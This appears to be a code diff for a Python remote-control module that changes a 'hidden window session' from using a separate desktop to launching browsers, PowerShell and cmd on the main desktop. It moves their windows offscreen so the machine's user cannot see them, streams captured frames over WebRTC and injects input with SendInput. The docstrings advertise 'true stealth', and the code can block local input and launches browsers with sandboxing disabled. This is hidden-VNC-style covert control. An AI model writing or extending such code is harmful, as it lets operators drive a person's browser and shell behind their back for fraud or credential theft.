@@ -1079,23 +1079,29 @@ class PrintWindowInputController:
 
 
 class HiddenWindowSession:
-    """Hidden window session using PrintWindow API.
+    """Hidden window session using PrintWindow API with offscreen windows.
     
-    This mode captures windows directly using PrintWindow API, compositing
-    them into a single frame. No driver installation required.
+    This mode runs applications on the MAIN desktop but moves their windows
+    offscreen (x=-10000) so the client cannot see them. PrintWindow API
+    can capture offscreen windows perfectly.
     
     Advantages:
     - No driver installation
-    - True stealth - client sees nothing
+    - True stealth - windows are offscreen, invisible to client
     - Works with any Windows version
+    - GPU renders windows properly (unlike hidden desktop)
     
     How it works:
-    1. Creates a hidden Windows Desktop
-    2. Launches applications on that desktop
+    1. Launches applications on main desktop with window position offscreen
+    2. Monitors and moves any new windows offscreen
     3. Captures window contents via PrintWindow API
     4. Composites windows into a single frame
-    5. Sends input via PostMessage to target windows
+    5. Sends input via SendInput (works globally)
     """
+    
+    # Offscreen position - far left of screen
+    OFFSCREEN_X = -10000
+    OFFSCREEN_Y = 0
     
     def __init__(self, width: int = 1920, height: int = 1080, fps: int = 30) -> None:
         if platform.system() != "Windows":
@@ -1108,11 +1114,15 @@ class HiddenWindowSession:
         self._height = height
         self._fps = fps
         
-        self._desktop_name = f"rc_hidden_{uuid.uuid4().hex}"
-        self._desktop_handle = _create_desktop(self._desktop_name)
-        self._desktop_path = f"WinSta0\\{self._desktop_name}"
+        # Track windows we've launched
+        self._our_pids: set[int] = set()
+        self._our_hwnds: set[int] = set()
         self._processes: list[subprocess.Popen] = []
         self._input_blocked = False
+        
+        # No separate desktop - use main desktop
+        self._desktop_handle = None
+        self._desktop_path = None
         
         self._block_local_input = os.getenv("RC_BLOCK_LOCAL_INPUT", "").strip().lower() in {
             "1",
@@ -1121,16 +1131,16 @@ class HiddenWindowSession:
             "on",
         }
         
-        # Start shell on hidden desktop
-        self._start_shell()
-        
-        # Initialize PrintWindow capture
+        # Initialize PrintWindow capture (no desktop handle = main desktop)
         self._capture = PrintWindowCapture(
-            desktop_handle=self._desktop_handle,
+            desktop_handle=None,  # Main desktop
             fps=fps,
             width=width,
             height=height,
         )
+        
+        # Override capture to only track our windows
+        self._capture._session._our_hwnds = self._our_hwnds
         
         # Wait for capture to initialize
         size = self._capture.frame_size
@@ -1142,62 +1152,113 @@ class HiddenWindowSession:
         # Create track for WebRTC
         self.screen_track = HiddenDesktopTrack(self._capture, profile="balanced")
         
-        # Create input controller
+        # Create input controller (uses SendInput on main desktop)
         self.input_controller = PrintWindowInputController(
-            self._desktop_handle,
+            None,  # No desktop handle
             self._capture,
-            size,
+            (width, height),
         )
+        
+        # Start window monitor thread
+        self._stop_monitor = threading.Event()
+        self._monitor_thread = threading.Thread(target=self._window_monitor_loop, daemon=True)
+        self._monitor_thread.start()
         
         if self._block_local_input:
             self.block_local_input()
         
-        logger.info("HiddenWindowSession started (PrintWindow mode)")
+        logger.info("HiddenWindowSession started (PrintWindow offscreen mode)")
     
-    def _start_shell(self) -> None:
-        """Start explorer and cmd on hidden desktop."""
-        startupinfo = subprocess.STARTUPINFO()
-        startupinfo.lpDesktop = self._desktop_path
-        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = subprocess.SW_HIDE
-        
-        for cmd in ("explorer.exe", "cmd.exe"):
+    def _window_monitor_loop(self) -> None:
+        """Monitor and move our windows offscreen."""
+        while not self._stop_monitor.is_set():
             try:
-                proc = subprocess.Popen([cmd], startupinfo=startupinfo)
-                self._processes.append(proc)
+                self._move_our_windows_offscreen()
             except Exception as exc:
-                logger.warning("Failed to start %s on hidden desktop: %s", cmd, exc)
+                logger.debug("Window monitor error: %s", exc)
+            self._stop_monitor.wait(0.5)
+    
+    def _move_our_windows_offscreen(self) -> None:
+        """Find and move all windows belonging to our processes offscreen."""
+        if not self._our_pids:
+            return
         
-        # Give explorer time to initialize
-        time.sleep(1.0)
+        @ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
+        def enum_callback(hwnd: int, lparam: int) -> bool:
+            try:
+                # Get window's process ID
+                pid = wintypes.DWORD()
+                user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+                
+                if pid.value in self._our_pids:
+                    # Check if window is visible
+                    if user32.IsWindowVisible(hwnd):
+                        # Get current position
+                        rect = RECT()
+                        user32.GetWindowRect(hwnd, ctypes.byref(rect))
+                        
+                        # If not already offscreen, move it
+                        if rect.left > self.OFFSCREEN_X + 100:
+                            width = rect.right - rect.left
+                            height = rect.bottom - rect.top
+                            
+                            # Move window offscreen
+                            SWP_NOSIZE = 0x0001
+                            SWP_NOZORDER = 0x0004
+                            SWP_NOACTIVATE = 0x0010
+                            SWP_SHOWWINDOW = 0x0040
+                            
+                            user32.SetWindowPos(
+                                hwnd,
+                                0,  # HWND_TOP
+                                self.OFFSCREEN_X,
+                                self.OFFSCREEN_Y,
+                                width,
+                                height,
+                                SWP_NOZORDER | SWP_NOACTIVATE | SWP_SHOWWINDOW
+                            )
+                            
+                            # Track this hwnd
+                            self._our_hwnds.add(hwnd)
+                            logger.debug("Moved window %d (PID %d) offscreen", hwnd, pid.value)
+            except Exception:
+                pass
+            return True
+        
+        user32.EnumWindows(enum_callback, 0)
     
     def launch_application(self, app_name: str, url: str | None = None) -> None:
-        """Launch an application on the hidden desktop.
+        """Launch an application and move its window offscreen.
         
         Args:
             app_name: Application name (chrome, firefox, etc.) or full path
             url: Optional URL to open (for browsers)
         
-        Supported applications with hidden mode:
+        Supported applications:
             - chrome, chromium: --no-sandbox --disable-gpu
-            - firefox: (runs in hidden desktop)
+            - firefox: runs normally
             - edge: --no-sandbox --disable-gpu
-            - powershell, pwsh: -WindowStyle Hidden
-            - cmd: runs hidden via startupinfo
+            - powershell, pwsh: runs with window
+            - cmd: runs with window
         """
         exe = _resolve_app_executable(app_name)
         if not exe:
             raise FileNotFoundError(f"Application not found: {app_name}")
         
+        # Normal startupinfo - we'll move window offscreen after creation
         startupinfo = subprocess.STARTUPINFO()
-        startupinfo.lpDesktop = self._desktop_path
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = 5  # SW_SHOW - need visible for PrintWindow
+        startupinfo.wShowWindow = 5  # SW_SHOW
+        
+        # Set window position to offscreen
+        startupinfo.dwFlags |= subprocess.STARTF_USEPOSITION
+        startupinfo.dwX = self.OFFSCREEN_X
+        startupinfo.dwY = self.OFFSCREEN_Y
         
         app_lower = app_name.lower()
         cmd = [exe]
         
-        # Add application-specific flags for hidden/headless operation
+        # Add application-specific flags
         if any(b in app_lower for b in ("chrome", "chromium")):
             cmd.extend([
                 "--no-sandbox",
@@ -1206,6 +1267,7 @@ class HiddenWindowSession:
                 "--disable-dev-shm-usage",
                 "--no-first-run",
                 "--no-default-browser-check",
+                f"--window-position={self.OFFSCREEN_X},{self.OFFSCREEN_Y}",
             ])
         elif "edge" in app_lower:
             cmd.extend([
@@ -1213,23 +1275,24 @@ class HiddenWindowSession:
                 "--disable-gpu",
                 "--disable-software-rasterizer",
                 "--no-first-run",
+                f"--window-position={self.OFFSCREEN_X},{self.OFFSCREEN_Y}",
             ])
         elif "firefox" in app_lower:
-            # Firefox works on hidden desktop without special flags
+            # Firefox doesn't have window-position flag, we'll move it via API
             pass
-        elif "powershell" in app_lower or "pwsh" in app_lower:
-            cmd.extend(["-WindowStyle", "Hidden"])
         
         if url:
             cmd.append(url)
         
         proc = subprocess.Popen(cmd, startupinfo=startupinfo)
         self._processes.append(proc)
+        self._our_pids.add(proc.pid)
         
-        # Give app time to create window
+        # Wait for window to appear and move it offscreen
         time.sleep(1.0)
+        self._move_our_windows_offscreen()
         
-        logger.info("Launched %s on hidden desktop (PID: %d), cmd: %s", app_name, proc.pid, " ".join(cmd[:3]))
+        logger.info("Launched %s offscreen (PID: %d), cmd: %s", app_name, proc.pid, " ".join(cmd[:3]))
     
     def get_windows(self) -> list:
         """Get list of tracked windows."""
@@ -1264,6 +1327,11 @@ class HiddenWindowSession:
         """Clean up session resources."""
         logger.info("Closing HiddenWindowSession")
         
+        # Stop window monitor
+        self._stop_monitor.set()
+        if self._monitor_thread.is_alive():
+            self._monitor_thread.join(timeout=1.0)
+        
         self.screen_track.stop()
         self.input_controller.close()
         self.unblock_local_input()
@@ -1275,13 +1343,11 @@ class HiddenWindowSession:
             except Exception:
                 pass
         self._processes.clear()
+        self._our_pids.clear()
+        self._our_hwnds.clear()
         
         # Close capture
         self._capture.close()
-        
-        # Close desktop
-        _close_desktop(self._desktop_handle)
-        self._desktop_handle = None
 
 
 def create_hidden_session(mode: str = "auto", **kwargs):
